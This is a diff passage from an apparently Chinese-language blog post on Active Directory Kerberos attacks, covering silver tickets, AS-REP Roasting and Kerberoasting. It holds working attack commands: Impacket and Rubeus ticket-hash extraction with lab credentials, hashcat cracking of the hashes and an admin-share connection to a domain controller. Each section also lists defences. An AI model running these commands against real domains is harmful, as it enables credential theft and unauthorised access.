+</span></span><span class="line"><span class="cl">/aes256 – AES256 密钥
+</span></span></code></pre></div><p><img src="https://raw.githubusercontent.com/lzzbb/lzzbb.github.io/master/picture/kerberos/17.png" alt=""></p>
+<p>在mimikatz上输入kerberos::list查看该票据，在机器上cmd窗口输入klist也能查到该票据</p>
+<p><img src="https://raw.githubusercontent.com/lzzbb/lzzbb.github.io/master/picture/kerberos/18.png" alt=""></p>
+<h4 id="验证是否成功target需要指向fqdn-1">验证是否成功（target需要指向FQDN）</h4>
+<p>在Client端通过Psexec.exe工具来与域控进行连接</p>
+<p><img src="https://raw.githubusercontent.com/lzzbb/lzzbb.github.io/master/picture/kerberos/19.png" alt=""></p>
+<p>或者直接建立ipc$连接</p>
+<p><code>net use \\WIN-KONG.hiro.com\c$</code></p>
+<p><img src="https://raw.githubusercontent.com/lzzbb/lzzbb.github.io/master/picture/kerberos/20.png" alt=""></p>
+<h4 id="白银票据特点">白银票据特点</h4>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-text" data-lang="text"><span class="line"><span class="cl">1.攻击者需要服务帐号密码哈希。
+</span></span><span class="line"><span class="cl">2.TGS 是伪造的，因此没有关联的 TGT，这意味着永远不会联系 DC。
+</span></span><span class="line"><span class="cl">3.事件日志都记录在目标服务器上。
+</span></span></code></pre></div><p><code>所以虽然白银票据范围比黄金票据更有限，但所需的hash更容易获得并且使用时没有与DC通信，因此白银票据更难检测。</code></p>
+<h4 id="白银票据攻击防范">白银票据攻击防范</h4>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-text" data-lang="text"><span class="line"><span class="cl">1. 尽量防止服务Hash不被窃取，并且开启PAC签名(PAC主要是规定服务器将票据发送给kerberos服务，由kerberos服务验证票据是否有效。)
+</span></span><span class="line"><span class="cl">2. 但是如果开启PAC认证，会降低认证效率，增加DC的负担，最根本的还是要加固服务器本身对外的服务。
+</span></span></code></pre></div><h4 id="黄金和白银票据的区别">黄金和白银票据的区别</h4>
+<p>1.访问权限不同</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-text" data-lang="text"><span class="line"><span class="cl">Golden Ticket是伪造的TGT(Ticket Granting Ticket)，所以可以获取任何Kerberos服务权限
+</span></span><span class="line"><span class="cl">Silver Ticket是伪造的TGS，也就是说其范围有限，只能访问指定的服务权限
+</span></span></code></pre></div><p>2.加密方式不同</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-text" data-lang="text"><span class="line"><span class="cl">Golden Ticket是由krbtgt的hash加密
+</span></span><span class="line"><span class="cl">Silver Ticket是由服务账户（通常为计算机账户）hash加密
+</span></span></code></pre></div><p>3.认证流程不同</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-text" data-lang="text"><span class="line"><span class="cl">Golden Ticket在使用的过程需要同域控通信
+</span></span><span class="line"><span class="cl">Silver Ticket在使用的过程不需要同域控通信
+</span></span></code></pre></div><hr>
+<h3 id="as-rep-roasting攻击">AS-REP Roasting攻击</h3>
+<p>当关闭了预身份认证后，攻击者可以使用指定用户去请求票据，此时域控不会做任何验证就将TGT票据和该用户Hash加密的Login Session Key返回。所以只要对Login Session Key离线解密，就可以得到指定用户的明文密码。</p>
+<p>enc-part是由用户密码Hash加密的，如果域用户设置了Do not require Kerberos preauthentication，可尝试爆破破解用户密码。</p>
+<p><img src="https://raw.githubusercontent.com/lzzbb/lzzbb.github.io/master/picture/kerberos/21.png" alt=""></p>
+<h4 id="利用">利用</h4>
+<p>1.GetNPUsers.py</p>
+<p><code>python3 GetNPUsers.py redteam.lab/zhuxin:'1qaz@WSX' -dc-ip 192.168.129.130 -request</code></p>
+<p><img src="https://raw.githubusercontent.com/lzzbb/lzzbb.github.io/master/picture/kerberos/22.png" alt=""></p>
+<p>2.Rubeus</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-text" data-lang="text"><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">`Rubeus.exe asreproast`
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">`Rubeus.exe asreproast /format:hashcat`
+</span></span></code></pre></div><p><img src="https://raw.githubusercontent.com/lzzbb/lzzbb.github.io/master/picture/kerberos/23.png" alt=""></p>
+<p>使用hashcat对其进行爆破：</p>
+<p>将hash.txt里面的除Hash字段其他的全删除，复制到hashcat目录下，并且修改为hashcat能识别的格式，在$krb5aasrep后面添加$23拼接。</p>
+<p><img src="https://raw.githubusercontent.com/lzzbb/lzzbb.github.io/master/picture/kerberos/24.png" alt=""></p>
+<p>然后使用以下命令爆破:</p>
+<p><code>hashcat.exe -m 18200 hash.txt —force</code></p>
+<p><img src="https://raw.githubusercontent.com/lzzbb/lzzbb.github.io/master/picture/kerberos/25.png" alt=""></p>
+<h4 id="as-rep-roasting攻击防范">AS-REP Roasting攻击防范</h4>
+<p>不要勾选“Do not require Kerberos preauthentication”选项。</p>
+<hr>
+<h3 id="kerberoast攻击">kerberoast攻击</h3>
+<p>kerberoast攻击发生在kerberos协议的TGS-REP阶段，返回的Enc-part由服务密码Hash加密，可以离线爆破爆破获得服务Hash，<code>不管用户对服务有没有访问权限，只要TGT正确就一定会返回ST</code>。</p>
+<p>每个SPN在域中都是唯一的，并且在用户或者计算机账户中的ServicePrincipalName字段中注册。在TGS-REQ中攻击者可以指定他们支持的kerberos加密类型(RC4,AES256等)。</p>
+<p>所有要走kerberos验证的服务,必须已事先注册好SPN,否则无法基于kerberos验证；而SPN又分两种：</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-text" data-lang="text"><span class="line"><span class="cl">1.关联在机器账户下的,默认情况大多数基本都属这种,实际利用意义不大,计算机帐户的密码默认每30天自动更新，密码长度为120个字符，所以说，即使获得了计算机帐户密码的hash，也很难还原出计算机帐户的明文口令。
+</span></span><span class="line"><span class="cl">2.被关联到某个域账户下，注册SPN成为服务方便域内认证。
+</span></span></code></pre></div><p><code>如果攻击者TGT是有效的，则DC从TGT认购权证中提取信息并填充到ST中。然后KDC查看哪个账户在ServicePrincipalName字段中注册了所请求的SPN。ST服务票据使用攻击者所要求的SPN账户的NTLM哈希进行加密，并使用攻击者和服务账户共同商定的加密算法。ST以服务票据(TGS_REP)的形式发送回攻击者。</code></p>
+<h4 id="查看当前域所有的spn">查看当前域所有的SPN：</h4>
+<p><code>setspn  -Q */*</code></p>
+<p><img src="https://raw.githubusercontent.com/lzzbb/lzzbb.github.io/master/picture/kerberos/26.png" alt=""></p>
+<h4 id="利用-1">利用</h4>
+<p>1.Rubeus:</p>
+<p>打印出注册域用户下的所有SPN的服务票据的hashcat格式</p>
+<p><code>Rubeus.exe kerberoast </code></p>
+<p><img src="https://raw.githubusercontent.com/lzzbb/lzzbb.github.io/master/picture/kerberos/27.png" alt=""></p>
+<p>将导出来的hashcat格式的哈希保存为hash.txt，放到hashcat目录下进行解密</p>
+<p><code>hashcat64.exe -m  13100  hash.txt  pass.txt</code></p>
+<p>2.GetUserSPNs.py</p>
+<p><code>python3 GetUserSPNs.py redteam.lab/zhuxin:1qaz@WSX -dc-ip 192.168.129.130 -request</code></p>
+<p><img src="https://raw.githubusercontent.com/lzzbb/lzzbb.github.io/master/picture/kerberos/28.png" alt=""></p>
+<p>将导出来的hashcat格式的哈希保存为hash.txt，放到hashcat目录下进行解密</p>
+<p><code>hashcat64.exe -m 13100 hash.txt pass.txt</code></p>
+<h4 id="kerberoast攻击防范">Kerberoast攻击防范</h4>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-text" data-lang="text"><span class="line"><span class="cl">1.保证密码复杂度
+</span></span><span class="line"><span class="cl">2.强制使用AES256对kerberos进行加密
+</span></span><span class="line"><span class="cl">3.监控ID为4679(请求Kerberos服务票据)的事件
+</span></span></code></pre></div>
+      </div>
+    </article>
+
+    <hr />
+
+    <div class="post-info">
+      
+    <p>
+        <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-tag meta-icon"><path d="M20.59 13.41l-7.17 7.17a2 2 0 0 1-2.83 0L2 12V2h10l8.59 8.59a2 2 0 0 1 0 2.82z"></path><line x1="7" y1="7" x2="7" y2="7"></line></svg>
+
+        <span class="tag"><a href="https://lzzbb.github.io/tags/ad/">AD</a></span>
+        
+    </p>
+
+      
+
+      <p>
+        <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-file-text">
+          <path d="M14 2H6a2 2 0 0 0-2 2v16a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2V8z"></path>
+          <polyline points="14 2 14 8 20 8"></polyline>
+          <line x1="16" y1="13" x2="8" y2="13"></line>
+          <line x1="16" y1="17" x2="8" y2="17"></line>
+          <polyline points="10 9 9 9 8 9"></polyline>
+        </svg>
+        610 Words
+      </p>
+
+      <p>
+        <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-calendar">
+          <rect x="3" y="4" width="18" height="18" rx="2" ry="2"></rect>
+          <line x1="16" y1="2" x2="16" y2="6"></line>
+          <line x1="8" y1="2" x2="8" y2="6"></line>
+          <line x1="3" y1="10" x2="21" y2="10"></line>
+        </svg>
+        
+          2021-04-20 08:00 &#43;0800
+        
+
+         
+          
+            
+              (Last updated: 2022-05-20 20:47 &#43;0800)
+            
+          
+        
+      </p>
+        <p>
+          <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-git-commit">
+            <circle cx="12" cy="12" r="4"></circle>
+            <line x1="1.05" y1="12" x2="7" y2="12"></line>
+            <line x1="17.01" y1="12" x2="22.96" y2="12"></line>
+          </svg>
+
+          <a href="https://github.com/coolbluemelvin/mlvn.io/commit/fb54e630fb5f850d9b0ef81645ca2de74a6f99ef" target="_blank" rel="noopener">fb54e63</a>
+          @ 2022-05-20
+        </p>
+    </div>
+
+    
+    <div class="pagination">
+        
+        <div class="pagination__title">
+            <span class="pagination__title-h">Read other posts</span>
+            <hr />
+        </div>
+        
+
+        <div class="pagination__buttons">
+            
+            <span class="button previous">
+                <a href="https://lzzbb.github.io/posts/2021/04/%E5%A7%94%E6%B4%BE%E5%88%A9%E7%94%A8%E9%9D%A2/">
+                    <span class="button__icon">←</span>
+                    <span class="button__text">委派利用面</span>
+                </a>
+            </span>
+            
+
+            
+            <span class="button next">
+                <a href="https://lzzbb.github.io/posts/2021/01/dcsync/">
+                    <span class="button__text">Dcsync</span>
+                    <span class="button__icon">→</span>
+                </a>
+            </span>
+            
+        </div>
+    </div>
+
+
+    
+
+    
+
+  </main>
+
+            </div>
+
+            
+                <footer class="footer">
+    
+    
+</footer>
+
+            
+        </div>
+
+        
+
+
+
+<script type="text/javascript" src="https://lzzbb.github.io/bundle.min.a2c5b062c87998f04d1b5dfb6a89a1b2d79786c21d0cb63a05e8a2082984b64b77d80955e3b97eab17273775162ba372511b711fea2f7608f216e68a67bb22d6.js" integrity="sha512-osWwYsh5mPBNG137aomhsteXhsIdDLY6BeiiCCmEtkt32AlV47l&#43;qxcnN3UWK6NyURtxH&#43;ovdgjyFuaKZ7si1g=="></script>
+
+
+
+    </body>
+</html>
